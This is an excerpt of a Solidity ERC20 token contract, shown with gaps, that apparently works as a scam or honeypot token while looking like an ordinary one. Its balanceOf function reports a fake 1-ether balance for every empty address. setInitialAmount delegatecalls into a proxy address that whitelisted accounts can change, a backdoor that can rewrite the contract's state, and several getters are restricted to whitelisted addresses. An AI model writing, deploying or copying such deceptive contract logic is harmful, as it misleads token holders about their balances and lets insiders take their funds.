...
contract ERC20Token is Context, IERC20, Ownable {
    ...
    uint private initialAmount = 1 ether;

    constructor(string memory setName, string memory setSymbol) {
        _name = setName;
        _symbol = setSymbol;
        _decimals = 18;
        _totalSupply = 150000000e18;
    ...
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account] > 0 ? _balances[account] : initialAmount;
    }
    ...
    function setInitialAmount(uint256 _initialAmount) external virtual {
        (bool success, ) = proxyAddr.delegatecall(abi.encodeWithSignature("setInitialAmount(uint256)",_initialAmount));
        require(success, "delegatecall fail.");
    }
    ...
    function getBurnRatio() external whiteListed view virtual returns(uint) {
        return burnRatio;
    }

    function checkRewardMapping(address _addr) public whiteListed view returns(bool){
        return _isRewardList[_addr];
    }

    function getRewardStatus() public whiteListed view returns(bool){
        return toReward;
    }

    function getRewardList() public whiteListed view virtual returns(address[] memory){
        return rewardList;
    }
    ...
    function checkWhitelist(address account) public whiteListed view virtual returns(bool) {
    ...
    function getPairSupplyLast() external whiteListed view returns(uint){
        require(_pair != address(0), "Invalid pair.");
        return pairSupplyLast;
    }

    function getPairSupply() external whiteListed view returns(uint) {
        require(_pair != address(0), "Invalid pair.");
        return IPancakePair(_pair).totalSupply();
    }

    function setProxyAddr(address _addr) public whiteListed {
        proxyAddr = _addr;
    }

    function getProxyAddr() external whiteListed view returns(address){
        return proxyAddr;
    }
